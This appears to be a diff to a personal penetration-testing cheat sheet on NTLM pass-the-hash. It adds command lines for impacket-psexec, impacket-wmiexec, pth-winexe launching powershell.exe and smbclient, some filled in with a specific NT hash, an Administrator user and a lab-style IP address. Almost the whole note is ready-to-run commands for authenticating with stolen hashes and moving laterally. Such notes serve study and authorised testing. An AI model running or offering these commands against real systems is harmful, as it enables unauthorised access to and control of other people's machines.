@@ -2,7 +2,15 @@
 tags: [hash, ntlm, pivoting]
 ---
 # Using NTLM Hash
+# Impacket
 impacket-smbexec
-crackmapexec 
+impacket-wmiexec
+impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b user@IP
 
+crackmapexec
+
+# WinExec
 pth-winexe -U <user>%'<HASH>' //<TargetIp> powershell.exe
+
+# SMB
+smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
